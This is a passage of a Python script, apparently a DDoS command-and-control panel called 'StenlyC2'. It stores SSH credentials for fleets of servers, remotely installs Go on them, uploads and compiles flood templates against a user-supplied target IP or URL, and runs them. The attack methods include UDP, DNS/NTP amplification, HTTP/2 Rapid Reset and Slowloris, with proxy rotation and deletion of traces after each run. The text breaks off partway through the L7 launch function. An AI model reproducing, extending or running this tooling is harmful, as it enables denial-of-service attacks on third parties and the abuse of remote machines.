#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import threading
import subprocess
import re
import socket
import select
import random
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import paramiko
except ImportError:
    print("[*] Installing paramiko...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko", "-q"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import paramiko

DB_FILE = "servers.json"
PROXY_FILE = "proxy.txt"
DEFAULT_KEY = os.path.expanduser("~/.ssh/id_rsa")
VERSION = "30.0-STENLYC2-ULTIMATE"

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
C = '\033[96m'
W = '\033[97m'
D = '\033[0m'
BD = '\033[1m'
DM = '\033[2m'

L4_METHODS = {
    '1': ('UDP', 'Standard UDP Flood'),
    '2': ('SAMP', 'SA-MP Query Flood'),
    '3': ('MIX', 'SAMP 80% + UDP 20%'),
    '4': ('AMPLIFY', 'DNS + NTP Amplification'),
    '5': ('GOD', 'ALL L4 METHODS COMBINED')
}

L7_METHODS = {
    '1': ('HTTP_FLOOD', 'HTTP GET Flood'),
    '2': ('HTTP2_RAPID', 'HTTP/2 Rapid Reset'),
    '3': ('SLOWLORIS', 'Slowloris Attack'),
    '4': ('WEBSOCKET', 'WebSocket Flood'),
    '5': ('POST_FLOOD', 'HTTP POST Flood'),
    '6': ('GOD_L7', 'ALL L7 METHODS COMBINED')
}

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                data = json.load(f)
                defaults = {
                    'servers_pwd': [],
                    'servers_key': [],
                    'proxies': [],
                    'stats': {
                        'attacks': 0,
                        'packets': 0,
                        'requests': 0,
                        'bytes': 0,
                        'time': 0,
                        'success_rate': 0.0
                    },
                    'l7_stats': {
                        'http_2xx': 0,
                        'http_4xx': 0,
                        'http_5xx': 0,
                        'failed': 0,
                        'avg_response_time': 0.0
                    },
                    'attack_history': []
                }
                for key, value in defaults.items():
                    if key not in data:
                        data[key] = value
                return data
        except Exception as e:
            print(f"{R}[-] DB Error: {e}{D}")
    
    return {
        'servers_pwd': [],
        'servers_key': [],
        'proxies': [],
        'stats': {
            'attacks': 0,
            'packets': 0,
            'requests': 0,
            'bytes': 0,
            'time': 0,
            'success_rate': 0.0
        },
        'l7_stats': {
            'http_2xx': 0,
            'http_4xx': 0,
            'http_5xx': 0,
            'failed': 0,
            'avg_response_time': 0.0
        },
        'attack_history': []
    }

def save_db(data):
    try:
        temp = DB_FILE + ".tmp"
        with open(temp, 'w') as f:
            json.dump(data, f, indent=2)
        os.replace(temp, DB_FILE)
    except Exception as e:
        print(f"{R}[-] Save Error: {e}{D}")

class SSH:
    def __init__(self, srv):
        self.srv = srv
        self.ssh = None
        self.sftp = None
        self.connected = False
        
    def connect(self, timeout=10):
        try:
            self.ssh = paramiko.SSHClient()
            self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            args = {
                'hostname': self.srv['host'],
                'port': self.srv.get('port', 22),
                'username': self.srv['username'],
                'timeout': timeout,
                'allow_agent': False,
                'look_for_keys': False,
                'banner_timeout': 30
            }
            
            if self.srv.get('auth_type') == 'key':
                key_file = self.srv.get('key_file', DEFAULT_KEY)
                if not os.path.exists(key_file):
                    return False
                
                try:
                    key = paramiko.RSAKey.from_private_key_file(key_file)
                except:
                    try:
                        key = paramiko.Ed25519Key.from_private_key_file(key_file)
                    except:
                        try:
                            key = paramiko.ECDSAKey.from_private_key_file(key_file)
                        except:
                            return False
                
                args['pkey'] = key
            else:
                args['password'] = self.srv['password']
            
            self.ssh.connect(**args)
            self.sftp = self.ssh.open_sftp()
            self.connected = True
            return True
        except Exception as e:
            self.connected = False
            return False
    
    def exe(self, cmd, timeout=60, pty=False):
        if not self.connected:
            return "ERROR: NOT_CONNECTED"
        try:
            stdin, stdout, stderr = self.ssh.exec_command(
                cmd, 
                timeout=timeout, 
                get_pty=pty,
                environment={'PATH': '/usr/local/bin:/usr/bin:/bin:/usr/local/go/bin'}
            )
            return stdout.read().decode('utf-8', errors='ignore') + stderr.read().decode('utf-8', errors='ignore')
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def upload(self, data, remote_path):
        if not self.connected:
            return False
        try:
            with self.sftp.file(remote_path, 'w') as f:
                f.write(data)
            return True
        except Exception as e:
            return False
    
    def close(self):
        try:
            if self.sftp:
                self.sftp.close()
            if self.ssh:
                self.ssh.close()
        except:
            pass
        self.connected = False

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    clear()
    print(f'''{R}{BD}
   _____ _             _            
  / ____| |           | |           
 | (___ | |_ ___ _ __ | | ___  _   _ 
  \___ \| __/ _ \ '_ \| |/ _ \| | | |
  ____) | ||  __/ | | | | (_) | |_| |
 |_____/ \__\___|_| |_|_|\___/ \__, |
                                __/ |
                               |___/ {C}v30{D}
{Y}        STENLYC2 - L4/L7 HYBRID{D}
{DM}        Developer: Stenly | Termux Optimized{D}
''')

def fmt_num(n):
    if n < 1000:
        return str(int(n))
    elif n < 1000000:
        return f"{n/1000:.1f}K"
    elif n < 1000000000:
        return f"{n/1000000:.1f}M"
    elif n < 1000000000000:
        return f"{n/1000000000:.1f}G"
    return f"{n/1000000000000:.1f}T"

def parse_num(s):
    s = str(s).strip().upper()
    if s.endswith('K'):
        return int(float(s[:-1]) * 1000)
    elif s.endswith('M'):
        return int(float(s[:-1]) * 1000000)
    elif s.endswith('B'):
        return int(float(s[:-1]) * 1000000000)
    elif s.endswith('T'):
        return int(float(s[:-1]) * 1000000000000)
    return int(float(s))

def test_l4(srv):
    print(f"{Y}[*] Testing {srv['host']} (L4)...{D}")
    c = SSH(srv)
    if not c.connect(10):
        print(f"{R}[-] {srv['host']} SSH Failed{D}")
        srv['active'] = False
        return False
    
    try:
        info = c.exe("echo CPU:$(nproc 2>/dev/null || echo 1); echo RAM:$(free -m 2>/dev/null | awk '/Mem/{print $2}' || echo 1024); echo LOAD:$(uptime | awk -F'load average:' '{print $2}' || echo 0.00)")
        
        for line in info.split('\n'):
            if line.startswith('CPU:'):
                srv['cpu'] = int(line.split(':')[1])
            elif line.startswith('RAM:'):
                srv['ram'] = int(line.split(':')[1])
            elif line.startswith('LOAD:'):
                srv['load'] = line.split(':')[1].strip()
        
        chk = c.exe("export PATH=$PATH:/usr/local/go/bin:/usr/local/bin; go version 2>/dev/null || echo NOTFOUND")
        
        if "NOTFOUND" in chk:
            print(f"{Y}[!] Installing Go on {srv['host']}...{D}")
            install_cmd = (
                "cd /tmp && rm -f go.tar.gz && "
                "wget -q --show-progress https://go.dev/dl/go1.21.0.linux-amd64.tar.gz -O go.tar.gz && "
                "tar -C /usr/local -xzf go.tar.gz 2>/dev/null && "
                "ln -sf /usr/local/go/bin/go /usr/local/bin/go 2>/dev/null; "
                "export PATH=$PATH:/usr/local/go/bin; go version"
            )
            ins = c.exe(install_cmd, 120)
            if "go version" not in ins:
                print(f"{R}[-] Go install failed on {srv['host']}{D}")
                c.close()
                srv['active'] = False
                return False
            print(f"{G}[+] Go installed{D}")
        
        ping = c.exe("ping -c 1 8.8.8.8 2>/dev/null | grep time= | head -1 | awk -F'time=' '{print $2}' | awk '{print $1}' || echo 999")
        try:
            srv['ping'] = float(ping.strip())
        except:
            srv['ping'] = 999
        
        srv['active'] = True
        srv['l4'] = True
        srv['bw'] = 100
        
        print(f"{G}[+] {srv['host']} Ready | CPU:{srv.get('cpu', '?')} | RAM:{srv.get('ram', '?')}MB | Ping:{srv['ping']:.0f}ms{D}")
        c.close()
        return True
        
    except Exception as e:
        print(f"{R}[-] Error on {srv['host']}: {str(e)[:50]}{D}")
        srv['active'] = False
        c.close()
        return False

def test_l7(srv):
    print(f"{Y}[*] Testing {srv['host']} (L7)...{D}")
    c = SSH(srv)
    if not c.connect(10):
        print(f"{R}[-] {srv['host']} SSH Failed{D}")
        srv['active'] = False
        return False
    
    try:
        info = c.exe("echo CPU:$(nproc 2>/dev/null || echo 1); echo RAM:$(free -m 2>/dev/null | awk '/Mem/{print $2}' || echo 1024)")
        lines = info.strip().split('\n')
        try:
            srv['cpu'] = int(lines[0].split(':')[1])
            srv['ram'] = int(lines[1].split(':')[1])
        except:
            srv['cpu'] = 2
            srv['ram'] = 1024
        
        chk = c.exe("export PATH=$PATH:/usr/local/go/bin:/usr/local/bin; go version 2>/dev/null || echo NOTFOUND")
        
        if "NOTFOUND" in chk:
            print(f"{Y}[!] Installing Go...{D}")
            ins = c.exe(
                "cd /tmp && wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz -O go.tar.gz && "
                "tar -C /usr/local -xzf go.tar.gz && "
                "ln -sf /usr/local/go/bin/go /usr/local/bin/go 2>/dev/null; "
                "export PATH=$PATH:/usr/local/go/bin; go version", 120
            )
            if "go version" not in ins:
                print(f"{R}[-] Go install failed{D}")
                c.close()
                srv['active'] = False
                return False
        
        print(f"{C}[*] Installing L7 modules on {srv['host']}...{D}")
        mod = c.exe(
            "export PATH=$PATH:/usr/local/go/bin && "
            "export GOPROXY=https://proxy.golang.org,direct && "
            "export GO111MODULE=on && "
            "mkdir -p /tmp/gomod && cd /tmp/gomod && "
            "go mod init temp 2>/dev/null || true && "
            "go get golang.org/x/net/http2@latest 2>&1 | tail -1 && "
            "go get golang.org/x/net/proxy@latest 2>&1 | tail -1 && "
            "go get github.com/gorilla/websocket@latest 2>&1 | tail -1 && "
            "cd / && rm -rf /tmp/gomod && echo MODULES_OK", 90
        )
        
        if "MODULES_OK" not in mod:
            print(f"{Y}[!] Module warning on {srv['host']}{D}")
        
        srv['active'] = True
        srv['l7'] = True
        srv['bw'] = 100
        
        print(f"{G}[+] {srv['host']} L7 Ready | CPU:{srv['cpu']}{D}")
        c.close()
        return True
        
    except Exception as e:
        print(f"{R}[-] Error: {str(e)[:50]}{D}")
        srv['active'] = False
        c.close()
        return False

def gen_l4(ip, port, duration, method, threads):
    try:
        with open('attack.go', 'r') as f:
            template = f.read()
        
        script = template.replace('{{.TargetIP}}', ip)
        script = script.replace('{{.TargetPort}}', str(port))
        script = script.replace('{{.Duration}}', str(duration))
        script = script.replace('{{.Threads}}', str(threads))
        script = script.replace('{{.Method}}', method)
        return script
    except FileNotFoundError:
        print(f"{R}[-] attack.go not found!{D}")
        return None
    except Exception as e:
        print(f"{R}[-] Template error: {e}{D}")
        return None

def gen_l7(url, duration, method, threads):
    try:
        with open('attackl7.go', 'r') as f:
            template = f.read()
        
        script = template.replace('{{.TargetURL}}', url)
        script = script.replace('{{.Duration}}', str(duration))
        script = script.replace('{{.Threads}}', str(threads))
        script = script.replace('{{.Method}}', method)
        return script
    except FileNotFoundError:
        print(f"{R}[-] attackl7.go not found!{D}")
        return None
    except Exception as e:
        print(f"{R}[-] Template error: {e}{D}")
        return None

def attack_l4(servers, ip, port, duration, method, threads, data):
    print(f"\n{BD}{R}>> L4 ATTACK DEPLOYMENT <<{D}")
    print(f"{C}Target: {ip}:{port}{D}")
    print(f"{C}Method: {method} | Duration: {duration}s | Threads/Srv: {threads}{D}")
    print(f"{C}Servers: {len(servers)}{D}\n")
    
    script = gen_l4(ip, port, duration, method, threads)
    if not script:
        input(f"\n{R}Press Enter...{D}")
        return
    
    results = {
        'packets': 0,
        'bytes': 0,
        'ok': 0,
        'fail': 0,
        'details': []
    }
    
    lock = threading.Lock()
    start = time.time()
    
    def run(srv, idx):
        c = SSH(srv)
        if not c.connect(15):
            with lock:
                results['fail'] += 1
            print(f"{R}[{idx}] {srv['host']} - Connection Failed{D}")
            return
        
        try:
            setup = (
                "mkdir -p /tmp/l4attack && cd /tmp/l4attack && "
                "rm -f attack.go attack 2>/dev/null"
            )
            c.exe(setup)
            
            c.upload(script, '/tmp/l4attack/attack.go')
            
            compile_cmd = (
                "export PATH=$PATH:/usr/local/go/bin:/usr/local/bin; "
                "cd /tmp/l4attack && "
                "go build -ldflags='-s -w' -o attack attack.go 2>&1; "
                "echo BUILD_EXIT:$?"
            )
            comp = c.exe(compile_cmd, 60)
            
            if "BUILD_EXIT:0" not in comp:
                with lock:
                    results['fail'] += 1
                print(f"{R}[{idx}] {srv['host']} - Build Failed{D}")
                c.exe("rm -rf /tmp/l4attack")
                c.close()
                return
            
            run_cmd = (
                "export PATH=$PATH:/usr/local/go/bin; "
                "cd /tmp/l4attack && "
                "ulimit -n 65535 2>/dev/null; "
                "nice -n -20 ./attack 2>&1"
            )
            out = c.exe(run_cmd, duration + 30, True)
            
            c.exe("rm -rf /tmp/l4attack")
            c.close()
            
            pkt = 0
            byt = 0
            pps = 0
            
            m = re.search(r'TOTAL PACKETS:\s+([\d.]+[KMBT]?)', out)
            if m:
                pkt = parse_num(m.group(1))
            
            m = re.search(r'TOTAL DATA:\s+([\d.]+)\s+MB', out)
            if m:
                byt = float(m.group(1)) * 1024 * 1024
            
            m = re.search(r'AVERAGE PPS:\s+([\d.]+[KMBT]?)', out)
            if m:
                pps = parse_num(m.group(1))
            
            with lock:
                results['packets'] += pkt
                results['bytes'] += byt
            
            if pkt > 0:
                with lock:
                    results['ok'] += 1
                print(f"{G}[{idx}] {srv['host']} | Packets: {fmt_num(pkt)} | PPS: {fmt_num(pps)}{D}")
                results['details'].append({
                    'host': srv['host'],
                    'packets': pkt,
                    'bytes': byt,
                    'status': 'success'
                })
            else:
                with lock:
                    results['fail'] += 1
                print(f"{R}[{idx}] {srv['host']} - No Output{D}")
                results['details'].append({
                    'host': srv['host'],
                    'status': 'failed'
                })
                
        except Exception as e:
            with lock:
                results['fail'] += 1
            print(f"{R}[{idx}] {srv['host']} - Error: {str(e)[:30]}{D}")
            try:
                c.exe("rm -rf /tmp/l4attack")
                c.close()
            except:
                pass
    
    ths = []
    for i, s in enumerate(servers):
        t = threading.Thread(target=run, args=(s, i+1))
        t.start()
        ths.append(t)
        time.sleep(0.2)
    
    for t in ths:
        t.join()
    
    elapsed = time.time() - start
    
    data['stats']['attacks'] += 1
    data['stats']['packets'] += results['packets']
    data['stats']['bytes'] += results['bytes']
    data['stats']['time'] += elapsed
    
    if data['stats']['attacks'] > 0:
        data['stats']['success_rate'] = (results['ok'] / len(servers)) * 100
    
    data['attack_history'].append({
        'type': 'L4',
        'target': f"{ip}:{port}",
        'method': method,
        'duration': duration,
        'servers': len(servers),
        'success': results['ok'],
        'packets': results['packets'],
        'timestamp': time.time()
    })
    
    save_db(data)
    
    avg_pps = results['packets'] // duration if duration > 0 else 0
    gbps = (results['bytes'] * 8) / (duration * 1024**3) if duration > 0 else 0
    
    print(f"\n{BD}{G}=== L4 ATTACK RESULT ==={D}")
    print(f"Success: {results['ok']}/{len(servers)}")
    print(f"Total Packets: {fmt_num(results['packets'])}")
    print(f"Total Data: {results['bytes']/1024/1024/1024:.2f} GB")
    print(f"Avg PPS: {fmt_num(avg_pps)}")
    print(f"Avg GBPS: {gbps:.2f}")

def attack_l7(servers, url, duration, method, threads, data):
    print(f"\n{BD}{P}>> L7 ATTACK DEPLOYMENT <<{D}")
    print(f"{C}Target: {url}{D}")
    print(f"{C}Method: {method} | Duration: {duration}s | Threads/Srv: {threads}{D}")
    print(f"{C}Servers: {len(servers)}{D}\n")
    
    script = gen_l7(url, duration, method, threads)
    if not script:
        input(f"\n{R}Press Enter...{D}")
        return
    
    proxies = data.get('proxies', [])
    active_proxies = [p['url'] for p in proxies if p.get('active')]
    proxy_content = '\n'.join(active_proxies[:500])
    
    results = {
        'requests': 0,
        'bytes': 0,
        'ok': 0,
        'fail': 0,
        'details': []
    }
    
    lock = threading.Lock()
    start = time.time()
    
    def run(srv, idx):
        c = SSH(srv)
        if not c.connect(15):
            with lock:
                results['fail'] += 1
            print(f"{R}[{idx}] {srv['host']} - Connection Failed{D}")
            return
        
        try:
            c.exe("mkdir -p /tmp/l7attack && rm -f /tmp/l7attack/*")
            
            if proxy_content:
                c.upload(proxy_content, '/tmp/l7attack/proxy.txt')
            
            c.upload(script, '/tmp/l7attack/attack.go')
            
            prep = (
                "export PATH=$PATH:/usr/local/go/bin && "
                "export GOPROXY=https://proxy.golang.org,direct && "
                "cd /tmp/l7attack && "
                "go mod init attack 2>/dev/null || true && "
                "go get golang.org/x/net/http2@latest 2>&1 | tail -1 && "
                "go get golang.org/x/net/proxy@latest 2>&1 | tail -1 && "
                "go get github.com/gorilla/websocket@latest 2>&1 | tail -1"
            )
            c.exe(prep, 60)
            
            comp = (
                "export PATH=$PATH:/usr/local/go/bin && "
                "cd /tmp/l7attack && "
                "go build -ldflags='-s -w' -o attack attack.go 2>&1; "
                "echo BUILD:$?"
            )
            comp_out = c.exe(comp, 60)
            
            if "BUILD:0" not in comp_out:
                with lock:
                    results['fail'] += 1
                print(f"{R}[{idx}] {srv['host']} - Build Failed{D}")
                c.exe("rm -rf /tmp/l7attack")
                c.close()
                return
            
            run_cmd = (
                "export PATH=$PATH:/usr/local/go/bin && "
                "cd /tmp/l7attack && "
                "ulimit -n 65535 2>/dev/null && "
                "nice -n -20 ./attack 2>&1"
            )
            out = c.exe(run_cmd, duration + 30, True)
            
            c.exe("rm -rf /tmp/l7attack")
            c.close()
            
            req = 0
            byt = 0
            rps = 0
            
            m = re.search(r'TOTAL REQUESTS:\s+([\d.]+[KMBT]?)', out)
            if m:
                req = parse_num(m.group(1))
            
            m = re.search(r'TOTAL DATA:\s+([\d.]+)\s+MB', out)
            if m:
                byt = float(m.group(1)) * 1024 * 1024
            
            m = re.search(r'AVERAGE RPS:\s+([\d.]+)', out)
            if m:
                rps = float(m.group(1))
            
            with lock:
                results['requests'] += req
                results['bytes'] += byt
            
            if req > 0:
                with lock:
                    results['ok'] += 1
                print(f"{G}[{idx}] {srv['host']} | Requests: {fmt_num(req)} | RPS: {rps:.0f}{D}")
                results['details'].append({
                    'host': srv['host'],
                    'requests': req,
                    'bytes': byt,
                    'status': 'success'
                })
            else:
                with lock:
                    results['fail'] += 1
                print(f"{R}[{idx}] {srv['host']} - No Output{D}")
                results['details'].append({
                    'host': srv['host'],
                    'status': 'failed'
                })
                
        except Exception as e:
            with lock:
                results['fail'] += 1
            print(f"{R}[{idx}] {srv['host']} - Error: {str(e)[:30]}{D}")
            try:
                c.exe("rm -rf /tmp/l7attack")
                c.close()
            except:
                pass
    
    ths = []
    for i, s in enumerate(servers):
        t = threading.Thread(target=run, args=(s, i+1))
        t.start()
        ths.append(t)
        time.sleep(0.2)
    
    for t in ths:
        t.join()
    
    elapsed = time.time() - start
    
    data['stats']['attacks'] += 1
    data['stats']['requests'] += results['requests']
    data['stats']['bytes'] += results['bytes']
    data['stats']['time'] += elapsed
    
    data['attack_history'].append({
        'type': 'L7',
        'target': url,
        'method': method,
        'duration': duration,
        'servers': len(servers),
        'success': results['ok'],
        'requests': results['requests'],
        'timestamp': time.time()
    })
    
    save_db(data)
    
    avg_rps = results['requests'] // duration if duration > 0 else 0
    gbps = (results['bytes'] * 8) / (duration * 1024**3) if duration > 0 else 0
    
    print(f"\n{BD}{G}=== L7 ATTACK RESULT ==={D}")
    print(f"Success: {results['ok']}/{len(servers)}")
    print(f"Total Requests: {fmt_num(results['requests'])}")
    print(f"Total Data: {results['bytes']/1024/1024/1024:.2f} GB")
    print(f"Avg RPS: {fmt_num(avg_rps)}")
    print(f"Avg GBPS: {gbps:.2f}")

def menu_pwd(data, mode):
    while True:
        banner()
        print(f"{BD}{Y}PASSWORD SERVERS MANAGEMENT [{mode.upper()}]{D}\n")
        
        srvs = data['servers_pwd']
        active = len([s for s in srvs if s.get('active')])
        total_bw = sum([s.get('bw', 0) for s in srvs if s.get('active')])
        
        print(f"Total: {len(srvs)} | Active: {active} | BW: {total_bw}Mbps\n")
        
        for i, s in enumerate(srvs, 1):
            st = f"{G}ON{D}" if s.get('active') else f"{R}OFF{D}"
            cap = ""
            if mode == 'l4':
                cap = f"{C}L4{D}" if s.get('l4') else f"{DM}--{D}"
            else:
                cap = f"{P}L7{D}" if s.get('l7') else f"{DM}--{D}"
            print(f"{i}. {s['host']} [{st}] [{cap}] {s.get('cpu', '?')}c")
        
        print(f"\n{BD}1{D}.Add {BD}2{D}.Bulk {BD}3{D}.Del {BD}4{D}.Test {BD}5{D}.TestAll {BD}0{D}.Back")
        ch = input(f"\n{Y}StenlyC2/PWD> {D}")
        
        if ch == '1':
            h = input("Host: ")
            u = input("Username: ")
            p = input("Password: ")
            port = int(input("Port[22]: ") or "22")
            srvs.append({
                'host': h, 'username': u, 'password': p, 'port': port,
                'auth_type': 'password', 'active': False, 'added': time.time()
            })
            save_db(data)
            print(f"{G}[+] Added{D}")
            time.sleep(0.5)
            
        elif ch == '2':
            path = input("File (host:port:user:pass): ")
            if os.path.exists(path):
                cnt = 0
                with open(path) as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            parts = line.split(':')
                            if len(parts) >= 4:
                                srvs.append({
                                    'host': parts[0],
                                    'port': int(parts[1]),
                                    'username': parts[2],
                                    'password': ':'.join(parts[3:]),
                                    'auth_type': 'password',
                                    'active': False,
                                    'added': time.time()
                                })
                                cnt += 1
                save_db(data)
                print(f"{G}[+] Added {cnt} servers{D}")
                time.sleep(1)
                
        elif ch == '3':
            if srvs:
                try:
                    idx = int(input("Delete #:")) - 1
                    if 0 <= idx < len(srvs):
                        del srvs[idx]
                        save_db(data)
                        print(f"{G}[+] Deleted{D}")
                except:
                    pass
                time.sleep(0.5)
                
        elif ch == '4':
            if srvs:
                try:
                    idx = int(input("Test #:")) - 1
                    if 0 <= idx < len(srvs):
                        if mode == 'l4':
                            test_l4(srvs[idx])
                        else:
                            test_l7(srvs[idx])
                        save_db(data)
                        input(f"\n{G}Press Enter...{D}")
                except Exception as e:
                    print(f"{R}[-] {e}{D}")
                    time.sleep(1)
                    
        elif ch == '5':
            if srvs:
                print(f"\n{Y}[*] Testing all...{D}")
                for s in srvs:
                    if mode == 'l4':
                        test_l4(s)
                    else:
                        test_l7(s)
                    save_db(data)
                input(f"\n{G}Press Enter...{D}")
                
        elif ch == '0':
            break

def menu_key(data, mode):
    global DEFAULT_KEY
    while True:
        banner()
        print(f"{BD}{Y}SSH KEY SERVERS MANAGEMENT [{mode.upper()}]{D}\n")
        
        srvs = data['servers_key']
        active = len([s for s in srvs if s.get('active')])
        
        print(f"Total: {len(srvs)} | Active: {active} | Key: {os.path.basename(DEFAULT_KEY)}\n")
        
        for i, s in enumerate(srvs, 1):
            st = f"{G}ON{D}" if s.get('active') else f"{R}OFF{D}"
            cap = ""
            if mode == 'l4':
                cap = f"{C}L4{D}" if s.get('l4') else f"{DM}--{D}"
            else:
                cap = f"{P}L7{D}" if s.get('l7') else f"{DM}--{D}"
            print(f"{i}. {s['host']} [{st}] [{cap}]")
        
        print(f"\n{BD}1{D}.Add {BD}2{D}.Bulk {BD}3{D}.Del {BD}4{D}.Test {BD}5{D}.TestAll {BD}6{D}.SetKey {BD}0{D}.Back")
        ch = input(f"\n{Y}StenlyC2/KEY> {D}")
        
        if ch == '1':
            h = input("Host: ")
            u = input("Username: ")
            k = input(f"Key[{DEFAULT_KEY}]: ") or DEFAULT_KEY
            port = int(input("Port[22]: ") or "22")
            srvs.append({
                'host': h, 'username': u, 'key_file': k, 'port': port,
                'auth_type': 'key', 'active': False, 'added': time.time()
            })
            save_db(data)
            print(f"{G}[+] Added{D}")
            time.sleep(0.5)
            
        elif ch == '2':
            path = input("File (host:port:user:key_path): ")
            if os.path.exists(path):
                cnt = 0
                with open(path) as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            parts = line.split(':')
                            if len(parts) >= 4:
                                srvs.append({
                                    'host': parts[0],
                                    'port': int(parts[1]),
                                    'username': parts[2],
                                    'key_file': ':'.join(parts[3:]),
                                    'auth_type': 'key',
                                    'active': False,
                                    'added': time.time()
                                })
                                cnt += 1
                save_db(data)
                print(f"{G}[+] Added {cnt} servers{D}")
                time.sleep(1)
                
        elif ch == '3':
            if srvs:
                try:
                    idx = int(input("Delete #:")) - 1
                    if 0 <= idx < len(srvs):
                        del srvs[idx]
                        save_db(data)
                        print(f"{G}[+] Deleted{D}")
                except:
                    pass
                time.sleep(0.5)
                
        elif ch == '4':
            if srvs:
                try:
                    idx = int(input("Test #:")) - 1
                    if 0 <= idx < len(srvs):
                        if mode == 'l4':
                            test_l4(srvs[idx])
                        else:
                            test_l7(srvs[idx])
                        save_db(data)
                        input(f"\n{G}Press Enter...{D}")
                except Exception as e:
                    print(f"{R}[-] {e}{D}")
                    time.sleep(1)
                    
        elif ch == '5':
            if srvs:
                print(f"\n{Y}[*] Testing all...{D}")
                for s in srvs:
                    if mode == 'l4':
                        test_l4(s)
                    else:
                        test_l7(s)
                    save_db(data)
                input(f"\n{G}Press Enter...{D}")
                
        elif ch == '6':
            DEFAULT_KEY = input(f"Key path[{DEFAULT_KEY}]: ") or DEFAULT_KEY
            print(f"{G}[+] Updated{D}")
            time.sleep(0.5)
            
        elif ch == '0':
            break

def menu_proxy(data):
    while True:
        banner()
        print(f"{BD}{C}PROXY MANAGEMENT{D}\n")
        
        px = data.get('proxies', [])
        active = len([p for p in px if p.get('active')])
        
        print(f"Total: {len(px)} | Active: {active}\n")
        
        for i, p in enumerate(px[:10], 1):
            st = f"{G}ON{D}" if p.get('active') else f"{R}OFF{D}"
            print(f"{i}. {p['url'][:40]}... [{st}]")
        
        if len(px) > 10:
            print(f"... and {len(px)-10} more")
        
        print(f"\n{BD}1{D}.LoadFile {BD}2{D}.Add {BD}3{D}.TestAll {BD}4{D}.Clean {BD}5{D}.Export {BD}0{D}.Back")
        ch = input(f"\n{Y}StenlyC2/PROXY> {D}")
        
        if ch == '1':
            path = input("File (ip:port per line): ")
            if os.path.exists(path):
                cnt = 0
                with open(path) as f:
                    for line in f:
                        line = line.strip()
                        if line and ':' in line:
                            if not line.startswith('http'):
                                line = f"http://{line}"
                            px.append({
                                'url': line,
                                'active': True,
                                'added': time.time()
                            })
                            cnt += 1
                save_db(data)
                print(f"{G}[+] Loaded {cnt} proxies{D}")
                time.sleep(1)
                
        elif ch == '2':
            p = input("Proxy (ip:port): ")
            if ':' in p:
                if not p.startswith('http'):
                    p = f"http://{p}"
                px.append({
                    'url': p,
                    'active': True,
                    'added': time.time()
                })
                save_db(data)
                print(f"{G}[+] Added{D}")
                time.sleep(0.5)
                
        elif ch == '3':
            print(f"{Y}[*] Testing proxies...{D}")
            def test_one(proxy, idx):
                try:
                    import urllib.request
                    opener = urllib.request.build_opener(
                        urllib.request.ProxyHandler({'http': proxy['url'], 'https': proxy['url']})
                    )
                    opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
                    start = time.time()
                    opener.open('http://httpbin.org/ip', timeout=10)
                    proxy['latency'] = time.time() - start
                    proxy['active'] = True
                    print(f"{G}[{idx}] {proxy['url'][:30]}... OK ({proxy['latency']:.1f}s){D}")
                except:
                    proxy['active'] = False
                    print(f"{R}[{idx}] {proxy['url'][:30]}... FAIL{D}")
            
            ths = []
            for i, p in enumerate(px[:20]):
                t = threading.Thread(target=test_one, args=(p, i+1))
                t.start()
                ths.append(t)
                time.sleep(0.1)
            for t in ths:
                t.join()
            save_db(data)
            input(f"\n{G}Press Enter...{D}")
            
        elif ch == '4':
            data['proxies'] = [p for p in px if p.get('active')]
            save_db(data)
            print(f"{G}[+] Cleaned{D}")
            time.sleep(0.5)
            
        elif ch == '5':
            with open(PROXY_FILE, 'w') as f:
                for p in px:
                    f.write(p['url'] + '\n')
            print(f"{G}[+] Exported to {PROXY_FILE}{D}")
            time.sleep(0.5)
            
        elif ch == '0':
            break

def launch_l4(data):
    pwd = [s for s in data['servers_pwd'] if s.get('active') or s.get('l4')]
    key = [s for s in data['servers_key'] if s.get('active') or s.get('l4')]
    
    if not pwd and not key:
        print(f"{R}[-] No L4 capable servers!{D}")
        input()
        return
    
    banner()
    print(f"{BD}{R}LAUNCH L4 ATTACK{D}\n")
    
    total_cpu = sum([s.get('cpu', 2) for s in pwd + key])
    total_bw = sum([s.get('bw', 0) for s in pwd + key])
    
    print(f"PWD: {len(pwd)} | KEY: {len(key)} | CPU: {total_cpu} cores | BW: {total_bw}Mbps\n")
    
    print(f"{BD}1{D}.Password Only")
    print(f"{BD}2{D}.SSH Key Only")
    print(f"{BD}3{D}.ALL Servers")
    ch = input(f"\n{Y}Select pool: {D}")
    
    if ch == '1':
        srvs = pwd
    elif ch == '2':
        srvs = key
    else:
        srvs = pwd + key
    
    if not srvs:
        return
    
    try:
        ip = input(f"\n{Y}Target IP: {D}")
        port = int(input(f"{Y}Port[7777]: {D}") or "7777")
        dur = int(input(f"{Y}Duration(s)[60]: {D}") or "60")
        
        print(f"\n{BD}METHODS:{D}")
        for k, (m, d) in L4_METHODS.items():
            print(f"{k}.{m} - {d}")
        meth = L4_METHODS.get(input(f"{Y}Select(1-5): {D}"), ('GOD', ''))[0]
        
        avg_cpu = sum([s.get('cpu', 2) for s in srvs]) / len(srvs)
        sugg = int(avg_cpu * 500)
        thr = int(input(f"\n{Y}Threads/server[{sugg}]: {D}") or str(sugg))
        
        est_pps = thr * 200 * len(srvs)
        est_gbps = (est_pps * 512 * 8) / 1e9
        
        print(f"\n{BD}ESTIMATE:{D}")
        print(f"PPS: {fmt_num(est_pps)} | GBPS: {est_gbps:.1f}")
        
        if input(f"\n{R}START ATTACK? (y/n): {D}").lower() == 'y':
            attack_l4(srvs, ip, port, dur, meth, thr, data)
            input(f"\n{G}Press Enter...{D}")
    except Exception as e:
        print(f"{R}[-] Error: {e}{D}")
        input()

def launch_l7(data):
    pwd = [s for s in data['servers_pwd'] if s.get('active') or s.get('l7')]
    key = [s for s in data['servers_key'] if s.get('active') or s.get('l7')]
    
    if not pwd and not key:
